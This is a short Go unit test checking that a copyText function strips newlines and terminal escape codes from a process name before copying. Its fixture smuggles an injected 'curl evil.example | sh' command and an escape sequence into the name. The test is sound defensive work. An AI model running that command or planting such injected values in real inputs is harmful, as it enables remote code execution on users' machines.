package ui

import (
	"strings"
	"testing"

	"github.com/padovanl/portop/internal/app"
)

func TestCopyTextCannotInjectCommands(t *testing.T) {
	row := app.Row{ProcessName: "web\ncurl evil.example | sh\x1b]0;x\x07", LocalPort: 8080, PID: 42}
	got := copyText(row)
	if strings.ContainsAny(got, "\n\r\x1b\x07") {
		t.Fatalf("copyText kept control characters: %q", got)
	}
	if !strings.HasSuffix(got, " :8080 (PID 42)") {
		t.Fatalf("copyText = %q", got)
	}
}
